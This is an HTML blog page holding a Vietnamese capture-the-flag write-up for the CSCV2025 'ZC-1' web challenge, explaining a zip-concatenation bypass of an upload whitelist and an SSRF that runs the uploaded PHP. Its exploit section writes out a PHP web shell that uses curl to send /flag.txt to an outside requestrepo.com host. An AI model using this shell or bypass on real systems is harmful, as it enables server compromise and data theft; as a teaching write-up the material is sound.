@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CSCV2025 | Web | ZC-1 | Jason</title>
+<meta name="keywords" content="web">
+<meta name="description" content="⚔️ ZC-1
+
+Category: Web
+Difficulty: _
+Author: _
+Description: _
+Resource: _
+
+
+🛰️Recon
+Tổng quan chung:
+Challenge bao gồm 2 ứng dụng web với:
+
+app1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080
+app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong
+
+Chi tiết
+App1
+Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/ctf_cscv2025_zc-1/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ctf_cscv2025_zc-1/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/posts/ctf_cscv2025_zc-1/">
+  <meta property="og:site_name" content="Jason">
+  <meta property="og:title" content="CSCV2025 | Web | ZC-1">
+  <meta property="og:description" content="⚔️ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ 🛰️Recon Tổng quan chung: Challenge bao gồm 2 ứng dụng web với:
+app1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080 app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong Chi tiết App1 Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):">
+  <meta property="og:locale" content="vi-vn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-20T00:00:00+07:00">
+    <meta property="article:modified_time" content="2025-10-20T00:00:00+07:00">
+    <meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSCV2025 | Web | ZC-1">
+<meta name="twitter:description" content="⚔️ ZC-1
+
+Category: Web
+Difficulty: _
+Author: _
+Description: _
+Resource: _
+
+
+🛰️Recon
+Tổng quan chung:
+Challenge bao gồm 2 ứng dụng web với:
+
+app1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080
+app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong
+
+Chi tiết
+App1
+Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CSCV2025 | Web | ZC-1",
+      "item": "http://localhost:1313/posts/ctf_cscv2025_zc-1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSCV2025 | Web | ZC-1",
+  "name": "CSCV2025 | Web | ZC-1",
+  "description": "⚔️ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ 🛰️Recon Tổng quan chung: Challenge bao gồm 2 ứng dụng web với:\napp1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080 app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong Chi tiết App1 Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):\n",
+  "keywords": [
+    "web"
+  ],
+  "articleBody": "⚔️ ZC-1 Category: Web Difficulty: _ Author: _ Description: _ Resource: _ 🛰️Recon Tổng quan chung: Challenge bao gồm 2 ứng dụng web với:\napp1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080 app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong Chi tiết App1 Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):\nPOST /gateway/user : cho phép người đăng kí với các trường username, password POST /gateway/transport : cho phép người dùng đã xác thực upload file zip Endpoint này sử dụng thư viện zipfile trong python để thực hiện kiểm tra file extension của các file entry trong file zip được upload dựa trên whilelist trước khi gửi nó đến endpoint upload.php của app2 GET /gateway/health : nhận vào param module cho phép người dùng kiểm tra hoạt động của các endpoint tại app2 POST auth/token : thực hiện xác thực người dùng với username và password, trả vể session token (sử dụng cho việc xác thực) và refresh token App2 Ứng dụng bao gồm các endpoint sau\nPOST upload.php: cho phép upload file zip (từ app1) và thực hiện giải nén file zip và lưu các file sau khi đã giải nén trong folder upload/ health.php: một file rỗng chỉ nhằm mục đích kiểm tra kết nối, hoạt động của app2 🧪 Dig \u0026 Analyze Dựa trên cấu trúc của challenge, hệ thống cho phép upload file zip sau đó thực hiện giải nén và lưu trữ các file entry trong ứng dụng web Php (thư mục lưu trữ file không có cấu hình để ngăn việc thực thi file .php). Vậy mục tiêu challenge ở đây khả năng cao là upload web shell thông qua việc upload file zip chứa file entry nguy hiểm.\nDựa trên mục tiêu trên, có 2 vấn đề cần giải quyết:\n1. Làm thế nào để bypass được file extension check ở app1 -\u003e Zip Concatenation Trong khi app1 thực hiện kiểm tra file zip upload với thư viện zipfile thì app2 lại sử dụng Archive7z\\Archive7z hay công cụ 7z để thực hiện giải nén file zip.\nBạn có thể chủ động tìm hiểu thêm về cấu trúc file zip để hiểu rõ hơn bài wriuteup, bài wriueup không đi sâu vào phân tích cấu trúc file zip hay giải thích cụ thể về lỗ hổng zip concatenation\nĐi vào chi tiết hơn cách mà 2 trình zip parser này hoạt động:\nĐối với python zipfile, trình đọc zip này không bắt đầu đọc từ đầu tệp mà thay vào đó, nó quét ngược từ cuối file để tìm kiếm lần lượt End of Central Directory, Central Directory, file entry dựa trên offset. Đối với 7z, định dạng này đặt signature và các header của nó ở đầu tệp. Công cụ 7z bắt đầu phân tích file zip từ đầu tệp (offset = 0) -\u003e Điểm không đồng nhất ở đây cùng với hình ảnh mô tả của challenge gợi cho tôi ý tưởng về việc tận dụng điểm khác biệt của 2 trình zip parser để tạo một file zip hợp lệ với cả 2 trình parser tuy nhiên nội dung đọc được của chúng lại khác nhau bởi cơ chế phân tích của chúng khác nhau.\nTìm hiểu thêm một vài kĩ thuật tấn công liên quan đến định dạng file Zip tôi tìm được kĩ thuật Zip Concatenation phù hợp với tình huống lỗ hổng này\n2. Làm thế nào để có thể thực thi file php nếu đã upload được thành công -\u003e SSRF Ứng dụng app1 cho phép kiểm tra hoạt động của backend tại endpoint GET /gateway/health. Endpoint này nhận vào params module, input này được nối chuỗi vào storage_url mà không qua kiểm tra sàng lọc dẫn đến có thể khai thác SSRF ở đây để gọi đến file php được upload -\u003e Thực thi thành công file .php 🔥 Exploit Tạo payload Tạo file zip an toàn chứa các file entry phù hợp với whitelist của challenge echo helloworld \u003e user.txt zip user.zip user.txt \u003e/dev/null Tạo 7z archive chứa web shell echo '\u003c?php system(\"curl https://w4zhdt6e.requestrepo.com/ -F \\\"file=@/flag.txt\\\"\") ?\u003e' \u003e shell.php 7z a -t7z evil.7z shell.php \u003e/dev/null File này có kích thước là 207 bytes (0xCF bytes)\nChỉnh sửa payload sao cho hợp lệ với zipfile Chúng ta sẽ thực hiện nối 2 file đơn giản bằng việc sử dụng lệnh cat\ncat evil.zip user.zip \u003e zipconcat.zip Tuy nhiên file zip này chưa hợp lệ bởi việc thêm trước file zip một file 7z sẽ khiến offset của phần user.zip bị thay đổi, do đó cần thực hiện chỉnh sửa offset sao cho payload này hợp lệ với zipfile\nCác 2 vị trí offset cần thay đổi (9D bởi thêm vào trước file này 0x9D bytes) là:\noffset tới Central Directory: nằm trong phần End of Centrol directory có giá trị là 4D chỉnh sửa thành 11C = 4D + CF offset tới Local file Header nằm tại offset 42 tình từ đầu mỗi Central Directory có giá trị là 00 chỉnh sửa thành CF = 00 + CF Trực tiếp thay đổi offset bằng việc sử dụng hex editor\ncat evil.7z user.zip \u003e zipconcat.zip Kiểm tra file với python zipfile Kiểm tra file zip với 7z Vì tập lệnh đặt tệp lưu trữ 7z ở ngay đầu tệp được kết hợp, nên các công cụ 7z sẽ coi tệp được kết hợp như một tệp lưu trữ 7z bình thường và trích xuất nội dung 7z (tệp PHP trong ví dụ của bạn) mà không cần động đến các cấu trúc ZIP được thêm vào phía dưới Mặc dù có thông báo lỗi bởi 7z phát hiện còn các bytes ở cuối file nhưng payload vẫn được giải nén thành công Thực hiện tấn công Tạo tài khoàn người dùng và lấy Authorization token (JWT):\nThực hiện upload file payload vừa tạo với Authorization header chứa token vừa lấy được\nThực hiện SSRF thể thực thi file php đã upload, tuy nhiên cần xác định được vị trí của file trên server\nFile sau khi extract được lưu tại thư mục upload/, chúng ta có thể dễ dàng tìm được user id trong JWT token\nThực hiện SSRF\nMặc dù request trả về “ERR” nhưng chúng ta vẫn thành công lấy được flag\n🏆 EXP -\u003e Zip Concatenation\n",
+  "wordCount" : "1107",
+  "inLanguage": "en",
+  "datePublished": "2025-10-20T00:00:00+07:00",
+  "dateModified": "2025-10-20T00:00:00+07:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/ctf_cscv2025_zc-1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jason",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Jason (Alt + H)">Jason</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="🏠 Home">
+                    <span>🏠 Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/ctf/" title="CTF Writeups">
+                    <span>CTF Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hackthebox/" title="Hackthebox">
+                    <span>Hackthebox</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      CSCV2025 | Web | ZC-1
+    </h1>
+    <div class="post-meta"><span title='2025-10-20 00:00:00 +0700 +07'>October 20, 2025</span>&nbsp;·&nbsp;<span>6 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#-zc-1" aria-label="⚔️ ZC-1">⚔️ ZC-1</a></li>
+                <li>
+                    <a href="#recon" aria-label="🛰️Recon">🛰️Recon</a><ul>
+                        
+                <li>
+                    <a href="#t%e1%bb%95ng-quan-chung" aria-label="Tổng quan chung:">Tổng quan chung:</a></li>
+                <li>
+                    <a href="#chi-ti%e1%ba%bft" aria-label="Chi tiết">Chi tiết</a><ul>
+                        
+                <li>
+                    <a href="#app1" aria-label="App1">App1</a></li>
+                <li>
+                    <a href="#app2" aria-label="App2">App2</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#-dig--analyze" aria-label="🧪 Dig &amp; Analyze">🧪 Dig &amp; Analyze</a><ul>
+                        
+                <li>
+                    <a href="#1-l%c3%a0m-th%e1%ba%bf-n%c3%a0o-%c4%91%e1%bb%83-bypass-%c4%91%c6%b0%e1%bb%a3c-file-extension-check-%e1%bb%9f-app1---zip-concatenation" aria-label="1. Làm thế nào để bypass được file extension check ở app1 -&gt; Zip Concatenation">1. Làm thế nào để bypass được file extension check ở app1 -&gt; Zip Concatenation</a></li>
+                <li>
+                    <a href="#2-l%c3%a0m-th%e1%ba%bf-n%c3%a0o-%c4%91%e1%bb%83-c%c3%b3-th%e1%bb%83-th%e1%bb%b1c-thi-file-php-n%e1%ba%bfu-%c4%91%c3%a3-upload-%c4%91%c6%b0%e1%bb%a3c-th%c3%a0nh-c%c3%b4ng---ssrf" aria-label="2. Làm thế nào để có thể thực thi file php nếu đã upload được thành công -&gt; SSRF">2. Làm thế nào để có thể thực thi file php nếu đã upload được thành công -&gt; SSRF</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-exploit" aria-label="🔥 Exploit">🔥 Exploit</a><ul>
+                        
+                <li>
+                    <a href="#t%e1%ba%a1o-payload" aria-label="Tạo payload">Tạo payload</a></li>
+                <li>
+                    <a href="#th%e1%bb%b1c-hi%e1%bb%87n-t%e1%ba%a5n-c%c3%b4ng" aria-label="Thực hiện tấn công">Thực hiện tấn công</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-exp" aria-label="🏆 EXP">🏆 EXP</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="-zc-1">⚔️ ZC-1<a hidden class="anchor" aria-hidden="true" href="#-zc-1">#</a></h1>
+<ul>
+<li><strong>Category:</strong> Web</li>
+<li><strong>Difficulty:</strong> _</li>
+<li><strong>Author:</strong> _</li>
+<li><strong>Description</strong>: _</li>
+<li><strong>Resource</strong>: _</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1omJ7XAex.png"></p>
+<h1 id="recon">🛰️Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h1>
+<h2 id="tổng-quan-chung">Tổng quan chung:<a hidden class="anchor" aria-hidden="true" href="#tổng-quan-chung">#</a></h2>
+<p>Challenge bao gồm 2 ứng dụng web với:</p>
+<ul>
+<li>app1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080</li>
+<li>app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong</li>
+</ul>
+<h2 id="chi-tiết">Chi tiết<a hidden class="anchor" aria-hidden="true" href="#chi-tiết">#</a></h2>
+<h3 id="app1">App1<a hidden class="anchor" aria-hidden="true" href="#app1">#</a></h3>
+<p>Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):</p>
+<ul>
+<li>POST <code>/gateway/user</code> : cho phép người đăng kí với các trường username, password</li>
+<li>POST <code>/gateway/transport</code> : cho phép người dùng đã xác thực upload file zip
+<ul>
+<li>Endpoint này sử dụng thư viện <code>zipfile</code> trong python để thực hiện kiểm tra file extension của các file entry trong file zip được upload dựa trên whilelist trước khi gửi nó đến endpoint <code>upload.php</code> của app2</li>
+</ul>
+</li>
+<li>GET <code>/gateway/health</code> : nhận vào param <code>module</code> cho phép người dùng kiểm tra hoạt động của các endpoint tại app2</li>
+<li>POST <code>auth/token</code> : thực hiện xác thực người dùng với username và password, trả vể session token (sử dụng cho việc xác thực) và refresh token</li>
+</ul>
+<h3 id="app2">App2<a hidden class="anchor" aria-hidden="true" href="#app2">#</a></h3>
+<p>Ứng dụng bao gồm các endpoint sau</p>
+<ul>
+<li>POST <code>upload.php</code>: cho phép upload file zip (từ app1) và thực hiện giải nén file zip và lưu các file sau khi đã giải nén trong folder <code>upload/&lt;user_id&gt;</code></li>
+<li><code>health.php</code>: một file rỗng chỉ nhằm mục đích kiểm tra kết nối, hoạt động của app2</li>
+</ul>
+<h1 id="-dig--analyze">🧪 Dig &amp; Analyze<a hidden class="anchor" aria-hidden="true" href="#-dig--analyze">#</a></h1>
+<p>Dựa trên cấu trúc của challenge, hệ thống cho phép upload file zip sau đó thực hiện giải nén và lưu trữ các file entry trong ứng dụng web Php (thư mục lưu trữ file không có cấu hình để ngăn việc thực thi file .php). Vậy mục tiêu challenge ở đây khả năng cao là upload web shell thông qua việc upload file zip chứa file entry nguy hiểm.</p>
+<p>Dựa trên mục tiêu trên, có 2 vấn đề cần giải quyết:</p>
+<h2 id="1-làm-thế-nào-để-bypass-được-file-extension-check-ở-app1---zip-concatenation">1. Làm thế nào để bypass được file extension check ở app1 -&gt; Zip Concatenation<a hidden class="anchor" aria-hidden="true" href="#1-làm-thế-nào-để-bypass-được-file-extension-check-ở-app1---zip-concatenation">#</a></h2>
+<p>Trong khi app1 thực hiện kiểm tra file zip upload với thư viện <code>zipfile</code> thì app2 lại sử dụng <code>Archive7z\Archive7z</code> hay công cụ <code>7z</code> để thực hiện giải nén file zip.</p>
+<blockquote>
+<p>Bạn có thể chủ động tìm hiểu thêm về cấu trúc file zip để hiểu rõ hơn bài wriuteup, bài wriueup không đi sâu vào phân tích cấu trúc file zip hay giải thích cụ thể về lỗ hổng zip concatenation</p>
+</blockquote>
+<p>Đi vào chi tiết hơn cách mà 2 trình zip parser này hoạt động:</p>
+<ul>
+<li><strong>Đối với <code>python zipfile</code></strong>, trình đọc zip này không bắt đầu đọc từ đầu tệp mà thay vào đó, nó quét ngược từ cuối file để tìm kiếm lần lượt <strong>End of Central Directory</strong>,  <strong>Central Directory</strong>, <strong>file entry</strong> dựa trên offset.
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rkWyeumCll.png"></li>
+<li><strong>Đối với <code>7z</code></strong>, định dạng này đặt signature và các header của nó ở đầu tệp. Công cụ 7z bắt đầu phân tích file zip từ đầu tệp (offset = 0)
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJBGg_QRgl.png"></li>
+</ul>
+<p>-&gt; Điểm không đồng nhất ở đây cùng với hình ảnh mô tả của challenge gợi cho tôi ý tưởng về việc tận dụng điểm khác biệt của 2 trình zip parser để tạo một file zip hợp lệ với cả 2 trình parser tuy nhiên nội dung đọc được của chúng lại khác nhau bởi cơ chế phân tích của chúng khác nhau.</p>
+<p>Tìm hiểu thêm một vài kĩ thuật tấn công liên quan đến định dạng file Zip tôi tìm được kĩ thuật <strong>Zip Concatenation</strong> phù hợp với tình huống lỗ hổng này</p>
+<h2 id="2-làm-thế-nào-để-có-thể-thực-thi-file-php-nếu-đã-upload-được-thành-công---ssrf">2. Làm thế nào để có thể thực thi file php nếu đã upload được thành công -&gt; SSRF<a hidden class="anchor" aria-hidden="true" href="#2-làm-thế-nào-để-có-thể-thực-thi-file-php-nếu-đã-upload-được-thành-công---ssrf">#</a></h2>
+<p>Ứng dụng app1 cho phép kiểm tra hoạt động của backend tại endpoint GET <code>/gateway/health</code>. Endpoint này nhận vào params <code>module</code>, input này được nối chuỗi vào <code>storage_url</code> mà không qua kiểm tra sàng lọc dẫn đến có thể khai thác SSRF ở đây để gọi đến file php được upload -&gt; Thực thi thành công file .php
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HkQzR770lx.png"></p>
+<h1 id="-exploit">🔥 Exploit<a hidden class="anchor" aria-hidden="true" href="#-exploit">#</a></h1>
+<h2 id="tạo-payload">Tạo payload<a hidden class="anchor" aria-hidden="true" href="#tạo-payload">#</a></h2>
+<ol>
+<li>Tạo file zip an toàn chứa các file entry phù hợp với whitelist của challenge</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo helloworld &gt; user.txt
+</span></span><span style="display:flex;"><span>zip user.zip user.txt &gt;/dev/null
+</span></span></code></pre></div><ol start="2">
+<li>Tạo 7z archive chứa web shell</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&lt;?php system(&#34;curl https://w4zhdt6e.requestrepo.com/ -F \&#34;file=@/flag.txt\&#34;&#34;) ?&gt;&#39;</span> &gt; shell.php
+</span></span><span style="display:flex;"><span>7z a -t7z evil.7z shell.php &gt;/dev/null
+</span></span></code></pre></div><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B1Fc8jmRxe.png"></p>
+<p>File này có kích thước là 207 bytes (0xCF bytes)</p>
+<ol start="3">
+<li>Chỉnh sửa payload sao cho hợp lệ với zipfile</li>
+</ol>
+<p>Chúng ta sẽ thực hiện nối 2 file đơn giản bằng việc sử dụng lệnh cat</p>
+<pre tabindex="0"><code>cat evil.zip user.zip &gt; zipconcat.zip
+</code></pre><p>Tuy nhiên file zip này chưa hợp lệ bởi việc thêm trước file zip một file 7z sẽ khiến offset của phần user.zip bị thay đổi, do đó cần thực hiện chỉnh sửa offset sao cho payload này hợp lệ với zipfile</p>
+<p>Các 2 vị trí offset cần thay đổi (9D bởi thêm vào trước file này 0x9D bytes) là:</p>
+<ul>
+<li>offset tới Central Directory:
+<ul>
+<li>nằm trong phần End of Centrol directory</li>
+<li>có giá trị là 4D</li>
+<li>chỉnh sửa thành <code>11C = 4D + CF</code></li>
+</ul>
+</li>
+<li>offset tới Local file Header
+<ul>
+<li>nằm tại offset 42 tình từ đầu mỗi Central Directory</li>
+<li>có giá trị là 00</li>
+<li>chỉnh sửa thành <code>CF = 00 + CF</code></li>
+</ul>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ByUSdi7Agl.png"></p>
+<p>Trực tiếp thay đổi offset bằng việc sử dụng hex editor</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJzXYoXRgx.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat evil.7z user.zip &gt; zipconcat.zip
+</span></span></code></pre></div><ol start="4">
+<li>
+<p>Kiểm tra file với python zipfile
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Hkxtz5XCle.png"></p>
+</li>
+<li>
+<p>Kiểm tra file zip với 7z
+Vì tập lệnh đặt tệp lưu trữ 7z ở ngay đầu tệp được kết hợp, nên các công cụ 7z sẽ coi tệp được kết hợp như một tệp lưu trữ 7z bình thường và trích xuất nội dung 7z (tệp PHP trong ví dụ của bạn) mà không cần động đến các cấu trúc ZIP được thêm vào phía dưới
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJcpMcQRxg.png">
+Mặc dù có thông báo lỗi bởi 7z phát hiện còn các bytes ở cuối file nhưng payload vẫn được giải nén thành công
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r18ZQ5X0ee.png"></p>
+</li>
+</ol>
+<h2 id="thực-hiện-tấn-công">Thực hiện tấn công<a hidden class="anchor" aria-hidden="true" href="#thực-hiện-tấn-công">#</a></h2>
+<p>Tạo tài khoàn người dùng và lấy Authorization token (JWT):</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rycWGimRlg.png"></p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1i1zjQRxe.png"></p>
+<p>Thực hiện upload file payload vừa tạo với Authorization header chứa token vừa lấy được</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ryTOMjmAex.png"></p>
+<p>Thực hiện SSRF thể thực thi file php đã upload, tuy nhiên cần xác định được vị trí của file trên server</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Byhx3qmRxl.png"></p>
+<p>File sau khi extract được lưu tại thư mục <code>upload/&lt;user_id&gt;</code>, chúng ta có thể dễ dàng tìm được user id trong JWT token</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1lafjmCee.png"></p>
+<p>Thực hiện SSRF</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SkFocoQRxx.png"></p>
+<p>Mặc dù request trả về &ldquo;ERR&rdquo; nhưng chúng ta vẫn thành công lấy được flag</p>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1wxjo70el.png"></p>
+<h1 id="-exp">🏆 EXP<a hidden class="anchor" aria-hidden="true" href="#-exp">#</a></h1>
+<p>-&gt; Zip Concatenation</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/posts/svattt/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Svattt</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Jason</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
